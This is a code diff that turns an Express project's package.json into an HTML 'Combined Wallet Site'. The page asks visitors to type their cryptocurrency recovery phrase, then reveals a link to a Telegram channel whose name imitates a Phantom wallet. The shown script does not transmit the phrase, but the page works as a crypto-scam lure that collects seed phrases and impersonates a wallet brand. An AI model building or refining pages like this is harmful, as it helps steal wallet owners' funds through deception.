@@ -1,15 +1,52 @@
-{
-  "name": "my-wallet-site",
-  "version": "1.0.0",
-  "description": "A wallet site with recovery phrase",
-  "main": "server.js",
-  "scripts": {
-    "start": "node server.js"
-  },
-  "dependencies": {
-    "express": "^4.17.1"
-  },
-  "devDependencies": {},
-  "author": "",
-  "license": "ISC"
-}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Combined Wallet Site</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="/styles/style.css">
+</head>
+<body>
+    <header>
+        <div class="logo">
+            <img src="/images/logo.png" alt="Wallet Logo">
+        </div>
+        <nav>
+            <a href="javascript:location.reload()">Home</a>
+            <a href="#features">Features</a>
+            <a href="#testimonials">Security</a>
+            <a href="#faq">About</a>
+        </nav>
+    </header>
+
+    <section class="recovery-box">
+        <h2>Enter Your Recovery Phrase</h2>
+        <textarea id="recovery-phrase" placeholder="Enter your recovery phrase here..."></textarea>
+        <button onclick="activateTelegram()">Connect Wallet</button>
+    
+        <!-- بخش Join Telegram که مخفی است و بعد از وارد کردن Recovery Phrase نمایش داده می‌شود -->
+        <div id="telegram-section" class="telegram-section">
+            <h3>Join Our Telegram Channel</h3>
+            <button onclick="window.location.href='https://t.me/PhantomwalltEN1'">Join Telegram</button>
+        </div>
+    </section>
+
+    <section class="hero">
+        <h2>Your Trusted Wallet Companion</h2>
+        <p>Manage your cryptocurrency in one secure and easy-to-use place.</p>
+        <button>Get Started</button>
+    </section>
+
+    <script>
+        function activateTelegram() {
+            var recoveryPhrase = document.getElementById("recovery-phrase").value;
+
+            if (recoveryPhrase.trim() !== "") {
+                document.getElementById("telegram-section").style.display = "flex"; // نمایش بخش Join Telegram
+            }
+        }
+    </script>
+
+</body>
+</html>
